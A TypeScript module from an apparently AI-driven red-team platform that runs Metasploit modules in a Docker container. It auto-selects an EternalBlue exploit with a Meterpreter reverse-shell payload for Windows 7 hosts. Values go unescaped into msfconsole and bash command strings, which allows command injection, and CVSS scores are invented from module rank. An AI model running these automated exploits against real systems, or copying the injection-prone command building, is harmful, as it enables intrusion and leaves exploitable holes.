import { dockerExecutor } from "./docker-executor";
import { db } from "../db";
import { securityTools } from "@shared/schema";
import { eq } from "drizzle-orm";
import { createLogger } from "../lib/logger";
import { logToolAudit } from "../auth/middleware";
import { toolExecutionDuration, toolExecutionsTotal } from "../lib/metrics";

const log = createLogger("metasploit-executor");

/**
 * Metasploit Module Executor
 * Handles execution of Metasploit modules with synchronous execution and output streaming
 */

export interface MetasploitModule {
  type: "exploit" | "payload" | "auxiliary" | "encoder" | "post" | "evasion" | "nop";
  path: string;
  parameters: Record<string, string>;
}

export interface ExecutionResult {
  success: boolean;
  output: string;
  stderr: string;
  exitCode: number;
  duration: number;
  moduleUsed: string;
  timestamp: string;
  cveIds?: string[];
  cweIds?: string[];
  cvssScore?: number | null;
}

class MetasploitExecutor {
  private executionLocks = new Map<string, boolean>();

  /**
   * Check if a tool execution is currently locked
   */
  isLocked(toolId: string): boolean {
    return this.executionLocks.get(toolId) || false;
  }

  /**
   * Lock a tool for execution
   */
  private lock(toolId: string): void {
    this.executionLocks.set(toolId, true);
  }

  /**
   * Unlock a tool after execution
   */
  private unlock(toolId: string): void {
    this.executionLocks.delete(toolId);
  }

  /**
   * Execute a Metasploit module synchronously
   */
  async execute(
    toolId: string,
    module: MetasploitModule,
    targetValue: string
  ): Promise<ExecutionResult> {
    // Check if already locked
    if (this.isLocked(toolId)) {
      throw new Error("Another execution is already in progress for this tool");
    }

    // Lock the tool
    this.lock(toolId);

    const startTime = Date.now();
    const timestamp = new Date().toISOString();

    try {
      // Update tool status to running
      await db
        .update(securityTools)
        .set({
          status: "running",
          lastUsed: new Date(),
        })
        .where(eq(securityTools.id, toolId));

      // Build msfconsole command
      const command = this.buildMsfCommand(module, targetValue);
      
      log.info({ toolId, module: `${module.type}/${module.path}`, target: targetValue }, "Executing Metasploit module");

      // Execute in Docker container
      const result = await dockerExecutor.exec("rtpi-tools", command, {
        timeout: 600000, // 10 minutes timeout
      });

      const duration = Date.now() - startTime;

      // Parse result and extract CVE/CWE from module path and output
      const fullOutput = (result.stdout || "") + (result.stderr || "");
      const { cveIds, cweIds, cvssScore } = this.extractVulnMetadata(
        `${module.type}/${module.path}`,
        fullOutput
      );

      const executionResult: ExecutionResult = {
        success: result.exitCode === 0,
        output: result.stdout || "",
        stderr: result.stderr || "",
        exitCode: result.exitCode,
        duration,
        moduleUsed: `${module.type}/${module.path}`,
        timestamp,
        cveIds: cveIds.length > 0 ? cveIds : undefined,
        cweIds: cweIds.length > 0 ? cweIds : undefined,
        cvssScore: cvssScore ?? undefined,
      };

      // Update tool status back to available and store execution result
      const tool = await db
        .select()
        .from(securityTools)
        .where(eq(securityTools.id, toolId))
        .limit(1);

      const currentMetadata = tool[0]?.metadata || {};
      const updatedMetadata = {
        ...currentMetadata,
        metasploit: {
          ...(currentMetadata as any)?.metasploit,
          lastExecution: {
            timestamp,
            success: executionResult.success,
            module: executionResult.moduleUsed,
            duration,
          },
        },
      };

      await db
        .update(securityTools)
        .set({
          status: "available",
          metadata: updatedMetadata,
        })
        .where(eq(securityTools.id, toolId));

      const status = executionResult.success ? "success" : "failure";
      toolExecutionDuration.observe({ tool: "metasploit", status }, duration / 1000);
      toolExecutionsTotal.inc({ tool: "metasploit", status });
      logToolAudit(null, "metasploit_execute", "metasploit", toolId, executionResult.success, {
        module: executionResult.moduleUsed, target: targetValue, duration, exitCode: executionResult.exitCode,
      });

      return executionResult;
    } catch (error) {
      const duration = Date.now() - startTime;
      const errorMsg = error instanceof Error ? error.message : String(error);

      toolExecutionDuration.observe({ tool: "metasploit", status: "failure" }, duration / 1000);
      toolExecutionsTotal.inc({ tool: "metasploit", status: "failure" });
      logToolAudit(null, "metasploit_execute", "metasploit", toolId, false, {
        module: `${module.type}/${module.path}`, target: targetValue, error: errorMsg,
      });

      // Reset tool status on error
      await db
        .update(securityTools)
        .set({ status: "available" })
        .where(eq(securityTools.id, toolId));

      return {
        success: false,
        output: "",
        stderr: errorMsg,
        exitCode: 1,
        duration,
        moduleUsed: `${module.type}/${module.path}`,
        timestamp,
      };
    } finally {
      // Always unlock
      this.unlock(toolId);
    }
  }

  /**
   * Build msfconsole command from module and parameters
   */
  private buildMsfCommand(
    module: MetasploitModule,
    targetValue: string
  ): string[] {
    // Strip type prefix from path if AI included it (e.g. "auxiliary/scanner/..." → "scanner/...")
    const cleanPath = module.path.startsWith(`${module.type}/`)
      ? module.path.slice(module.type.length + 1)
      : module.path;
    const fullModulePath = `${module.type}/${cleanPath}`;
    
    // Build msfconsole resource script commands
    const commands: string[] = [
      `use ${fullModulePath}`,
    ];

    // Add RHOST parameter (target)
    if (targetValue) {
      commands.push(`set RHOST ${targetValue}`);
    }

    // Add all other parameters
    for (const [key, value] of Object.entries(module.parameters)) {
      if (key !== "RHOST" && value) {
        // Escape quotes in value
        const escapedValue = value.replace(/"/g, '\\"');
        commands.push(`set ${key} ${escapedValue}`);
      }
    }

    // Add execution command based on module type
    if (module.type === "auxiliary") {
      commands.push("run");
    } else if (module.type === "exploit") {
      commands.push("exploit");
    } else if (module.type === "payload") {
      commands.push("generate");
    }

    // Exit msfconsole
    commands.push("exit");

    // Join commands with semicolons
    const commandString = commands.join("; ");

    // Return as array for docker exec
    return ["msfconsole", "-q", "-x", commandString];
  }

  /**
   * Get module information (options, description, etc.)
   */
  async getModuleInfo(moduleType: string, modulePath: string): Promise<any> {
    const fullPath = `${moduleType}/${modulePath}`;
    
    try {
      const command = ["msfconsole", "-q", "-x", `info ${fullPath}; exit`];
      const result = await dockerExecutor.exec("rtpi-tools", command, {
        timeout: 30000, // 30 seconds
      });

      return this.parseModuleInfo(result.stdout);
    } catch (error) {
      log.error({ err: error, moduleType, modulePath }, "Failed to get module info");
      return null;
    }
  }

  /**
   * Parse module info output from msfconsole
   */
  private parseModuleInfo(output: string): any {
    const info: any = {
      name: "",
      description: "",
      author: [],
      platform: [],
      rank: "",
      options: [],
      references: [],
    };

    const lines = output.split("\n");
    let currentSection = "";
    let collectingOptions = false;

    for (const line of lines) {
      const trimmed = line.trim();

      if (trimmed.startsWith("Name:")) {
        info.name = trimmed.replace("Name:", "").trim();
      } else if (trimmed.includes("Description:")) {
        currentSection = "description";
      } else if (currentSection === "description" && trimmed && !trimmed.startsWith("Module")) {
        info.description = trimmed;
        currentSection = "";
      } else if (trimmed.includes("Author:")) {
        currentSection = "author";
      } else if (currentSection === "author" && trimmed && !trimmed.startsWith("Platform")) {
        info.author.push(trimmed);
      } else if (trimmed.includes("Platform:")) {
        const platforms = trimmed.replace("Platform:", "").trim().split(",");
        info.platform = platforms.map((p) => p.trim());
        currentSection = "";
      } else if (trimmed.includes("Rank:")) {
        const rankMatch = trimmed.match(/Rank:\s+(\w+)/);
        if (rankMatch) {
          info.rank = rankMatch[1];
        }
      } else if (trimmed.includes("Basic options:") || trimmed.includes("Module options")) {
        collectingOptions = true;
        currentSection = "options";
      } else if (collectingOptions && trimmed.includes("Name") && trimmed.includes("Current Setting")) {
        // Skip header
        continue;
      } else if (collectingOptions && trimmed.includes("----")) {
        // Skip separator
        continue;
      } else if (collectingOptions && trimmed && !trimmed.startsWith("Payload") && !trimmed.startsWith("Description")) {
        // Parse option line
        const parts = trimmed.split(/\s{2,}/);
        if (parts.length >= 3) {
          info.options.push({
            name: parts[0],
            current: parts[1] || "",
            required: parts[2] === "yes",
            description: parts[3] || "",
          });
        }
      } else if (trimmed.includes("References:")) {
        collectingOptions = false;
        currentSection = "references";
      } else if (currentSection === "references" && trimmed) {
        info.references.push(trimmed);
      }
    }

    // Extract CVE/CWE/CVSS from references and full output
    const { cveIds, cweIds, cvssScore } = this.extractVulnMetadata("", output, info.rank);
    info.cveIds = cveIds;
    info.cweIds = cweIds;
    info.cvssScore = cvssScore;

    return info;
  }

  private static readonly RANK_TO_CVSS: Record<string, number> = {
    excellent: 9.8,
    great: 8.5,
    good: 7.0,
    normal: 5.0,
    average: 4.0,
    low: 2.0,
    manual: 0,
  };

  private extractVulnMetadata(
    modulePath: string,
    output: string,
    rank?: string
  ): { cveIds: string[]; cweIds: string[]; cvssScore: number | null } {
    const combined = `${modulePath}\n${output}`;

    const cveMatches = combined.match(/CVE-\d{4}-\d{4,}/gi) || [];
    const cveIds = [...new Set(cveMatches.map(c => c.toUpperCase()))];

    const cweMatches = combined.match(/CWE-\d+/gi) || [];
    const cweIds = [...new Set(cweMatches.map(c => c.toUpperCase()))];

    let cvssScore: number | null = null;
    const cvssMatch = combined.match(/CVSS(?:v[23])?[:\s]+(\d+(?:\.\d+)?)/i);
    if (cvssMatch) {
      cvssScore = parseFloat(cvssMatch[1]);
    } else if (rank && MetasploitExecutor.RANK_TO_CVSS[rank.toLowerCase()] !== undefined) {
      cvssScore = MetasploitExecutor.RANK_TO_CVSS[rank.toLowerCase()];
    }

    return { cveIds, cweIds, cvssScore };
  }

  /**
   * Search for modules in Metasploit database
   */
  async searchModules(query: string, moduleType?: string): Promise<any[]> {
    if (!query || query.trim().length < 2) {
      return [];
    }

    try {
      // Build search command
      let searchCommand = `search ${query}`;
      if (moduleType) {
        searchCommand += ` type:${moduleType}`;
      }

      const command = ["msfconsole", "-q", "-x", `${searchCommand}; exit`];

      const result = await dockerExecutor.exec("rtpi-tools", command, {
        timeout: 30000, // 30 seconds
      });

      return this.parseSearchResults(result.stdout, moduleType);
    } catch (error) {
      log.error({ err: error, query }, "Failed to search modules");
      return [];
    }
  }

  /**
   * Parse search results from msfconsole output
   */
  private parseSearchResults(output: string, filterType?: string): any[] {
    const modules: any[] = [];
    const lines = output.split("\n");
    let inResultsSection = false;

    for (const line of lines) {
      const trimmed = line.trim();

      // Skip until we hit the results section
      if (trimmed.includes("Matching Modules") || trimmed.includes("Name") && trimmed.includes("Disclosure Date")) {
        inResultsSection = true;
        continue;
      }

      // Skip separator lines
      if (trimmed.includes("====") || trimmed.includes("----")) {
        continue;
      }

      // Stop at interact or end markers
      if (trimmed.includes("Interact with") || !trimmed) {
        if (modules.length > 0) break;
        continue;
      }

      if (inResultsSection && trimmed) {
        // Parse module line format: "  #  Name                           Disclosure Date  Rank    Check  Description"
        // Example: "  0  exploit/windows/smb/ms17_010   2017-03-14       average  Yes    MS17-010 EternalBlue SMB..."

        const match = trimmed.match(/^\s*\d+\s+(\S+)\s+(.*)$/);
        if (match) {
          const fullPath = match[1];
          const parts = fullPath.split("/");

          if (parts.length >= 2) {
            const type = parts[0];
            const path = parts.slice(1).join("/");

            // Filter by type if specified
            if (!filterType || type === filterType) {
              // Parse the rest for additional info
              const restParts = match[2].trim().split(/\s{2,}/);

              const desc = restParts[restParts.length - 1] || "";
              const searchText = `${fullPath} ${desc}`;
              const cveMatches = searchText.match(/CVE-\d{4}-\d{4,}/gi) || [];

              modules.push({
                type,
                path,
                fullPath,
                disclosureDate: restParts[0] || "",
                rank: restParts[1] || "",
                description: desc,
                displayName: path.split("/").pop() || path,
                cveIds: [...new Set(cveMatches.map(c => c.toUpperCase()))],
              });
            }
          }
        }
      }
    }

    return modules;
  }

  /**
   * Auto-select appropriate module based on target reconnaissance data
   */
  selectModuleForTarget(
    targetData: any,
    _availableModules: any
  ): MetasploitModule | null {
    const services = targetData.discoveredServices || [];
    const metadata = targetData.metadata || {};

    // Determine OS/platform from metadata
    const os = (metadata.os || "").toLowerCase();
    const openPorts = metadata.openPorts || [];

    // Logic to select appropriate exploit/auxiliary module
    if (services.length > 0) {
      // Check for common vulnerable services
      for (const service of services) {
        const serviceName = service.name?.toLowerCase() || "";
        const port = service.port;

        // SMB vulnerabilities
        if ((serviceName.includes("smb") || port === 445) && os.includes("windows")) {
          // Check for EternalBlue if Windows 7/2008
          if (
            os.includes("windows 7") ||
            os.includes("windows server 2008") ||
            os.includes("win7")
          ) {
            return {
              type: "exploit",
              path: "windows/smb/ms17_010_eternalblue",
              parameters: {
                PAYLOAD: "windows/meterpreter/reverse_tcp",
                LHOST: metadata.attackerIp || "0.0.0.0",
                LPORT: "4444",
              },
            };
          }
        }

        // SSH service - use scanner
        if (serviceName.includes("ssh") || port === 22) {
          return {
            type: "auxiliary",
            path: "scanner/ssh/ssh_version",
            parameters: {},
          };
        }

        // HTTP/HTTPS - web scanner
        if (serviceName.includes("http") || port === 80 || port === 443) {
          return {
            type: "auxiliary",
            path: "scanner/http/http_version",
            parameters: {
              RPORT: String(port),
            },
          };
        }
      }
    }

    // Default to port scanner if no specific module found
    return {
      type: "auxiliary",
      path: "scanner/portscan/tcp",
      parameters: {
        PORTS: openPorts.join(",") || "1-1000",
      },
    };
  }

  /**
   * Load a custom Metasploit module (.rb) into the container's module directory.
   * The module will be available for subsequent execution via msfconsole.
   */
  async loadCustomModule(
    moduleContent: string,
    modulePath: string,
    moduleType: string = "exploit"
  ): Promise<{ success: boolean; loadedPath: string; error?: string }> {
    const containerModulePath = `/root/.msf4/modules/${moduleType}s/${modulePath}`;
    const dirPath = containerModulePath.substring(0, containerModulePath.lastIndexOf('/'));

    try {
      // Create directory structure
      await dockerExecutor.exec("rtpi-tools", ["mkdir", "-p", dirPath], {
        timeout: 10000,
      });

      // Write module file via stdin
      await dockerExecutor.exec(
        "rtpi-tools",
        ["bash", "-c", `cat > ${containerModulePath}`],
        {
          timeout: 10000,
          stdin: moduleContent,
        }
      );

      // Reload modules in msfconsole
      await dockerExecutor.exec(
        "rtpi-tools",
        ["msfconsole", "-q", "-x", "reload_all; exit"],
        { timeout: 30000 }
      );

      log.info({ path: containerModulePath }, "Custom module loaded");

      return {
        success: true,
        loadedPath: `${moduleType}/${modulePath.replace(/\.rb$/, '')}`,
      };
    } catch (error) {
      const errorMsg = error instanceof Error ? error.message : String(error);
      log.error({ err: error, path: containerModulePath }, "Failed to load custom module");
      return {
        success: false,
        loadedPath: containerModulePath,
        error: errorMsg,
      };
    }
  }
}

export const metasploitExecutor = new MetasploitExecutor();
